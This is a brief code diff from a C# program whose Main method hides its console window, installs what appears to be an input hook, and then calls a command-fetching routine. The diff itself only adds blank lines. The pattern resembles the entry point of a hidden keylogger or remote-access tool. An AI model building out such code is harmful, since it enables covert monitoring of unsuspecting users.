@@ -31,9 +31,11 @@ namespace Karios
 
         public static void Main()
         {
+            
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
             _hookID = SetHook(_proc);
+            
             CommandGet();
                         
         }
